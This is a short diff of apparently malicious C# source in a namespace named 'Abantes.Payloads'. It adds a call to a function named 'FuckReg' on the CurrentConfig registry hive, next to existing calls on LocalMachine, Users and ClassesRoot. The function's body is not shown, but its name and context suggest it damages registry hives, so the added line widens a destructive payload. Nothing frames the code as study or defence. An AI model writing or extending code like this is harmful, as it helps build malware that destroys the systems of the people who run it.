@@ -158,6 +158,7 @@ namespace Abantes.Payloads
             FuckReg(Registry.LocalMachine);
             FuckReg(Registry.Users);
             FuckReg(Registry.ClassesRoot);
+            FuckReg(Registry.CurrentConfig);
         }
         public static void FuckReg(RegistryKey key)
         {
